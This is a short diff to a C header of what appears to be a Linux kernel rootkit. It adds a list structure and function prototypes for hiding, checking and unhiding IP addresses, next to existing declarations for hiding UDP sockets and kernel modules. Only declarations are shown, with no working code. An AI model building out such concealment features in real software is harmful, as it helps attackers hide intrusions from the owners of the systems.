@@ -35,6 +35,12 @@ struct udp_socket {
 	int port;
 };
 
+/* list for hidden ip addresses */
+struct hidden_ip {
+	struct list_head list;
+	__u32 ipaddr;
+};
+
 /* list for hidden kernel modules (by module name) */
 // TODO: think of a better way to store hidden modules
 struct modules {
@@ -117,6 +123,15 @@ int
 unhide_udp_socket(int port);
 
 int
+is_ip_hidden(__u32 ipaddr);
+
+int
+hide_ip_address(__u32 ipaddr);
+
+int
+unhide_ip_address(__u32 ipaddr);
+
+int
 is_module_hidden(char *name);
 
 int
@@ -141,4 +156,3 @@ void
 cleanup_control(void);
 
 #endif
-
